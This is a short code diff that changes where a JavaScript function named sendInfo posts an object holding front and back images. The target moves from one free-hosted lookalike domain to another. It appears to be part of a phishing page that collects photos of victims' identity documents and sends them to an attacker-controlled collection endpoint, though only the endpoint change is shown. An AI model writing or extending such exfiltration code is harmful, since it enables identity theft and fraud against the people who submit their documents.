@@ -208,7 +208,7 @@ const sendInfo = async () => {
       frontImg: front,
       backImg: back,
     };
-    fetch("https://firmascecapia.netlify.app/data", {
+    fetch("https://subvray.github.io/Cecapia.github.io/data", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
